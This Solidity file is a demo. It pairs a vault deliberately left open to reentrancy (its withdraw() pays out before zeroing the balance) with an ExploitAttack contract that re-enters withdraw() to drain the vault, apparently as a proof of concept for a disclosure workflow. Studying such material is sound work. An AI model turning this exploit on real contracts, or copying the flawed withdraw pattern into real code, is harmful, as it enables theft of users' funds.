// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title  VulnerableVault
/// @notice Deliberately vulnerable DeFi vault for demo purposes.
///         Contains a classic reentrancy bug in withdraw().
///         Deploy with testnet funds — the exploit drains 100% of the balance.
///
/// WARNING: This contract is intentionally insecure. Never deploy with real funds.
contract VulnerableVault {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @dev VULNERABLE: state update happens AFTER external call.
    ///      Classic checks-effects-interactions violation.
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        // ❌ External call before state update — reentrancy entry point
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        // State update too late — attacker re-enters before this runs
        balances[msg.sender] = 0;

        emit Withdrawal(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title  ExploitAttack
/// @notice The PoC attack contract that demonstrates the reentrancy.
///         Researcher encrypts this (or its bytecode) as the exploit payload.
///         TEE runs this against a fork of VulnerableVault's state to prove severity.
contract ExploitAttack {
    VulnerableVault public target;
    address public owner;

    constructor(address _target) {
        target = VulnerableVault(_target);
        owner  = msg.sender;
    }

    /// @notice Seed the attack with 1 wei, then drain the entire vault.
    function attack() external payable {
        require(msg.value > 0, "need seed funds");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    /// @notice Re-entry hook — loops until vault is drained.
    receive() external payable {
        if (address(target).balance >= 1) {
            target.withdraw();
        }
    }

    function drain() external {
        require(msg.sender == owner);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
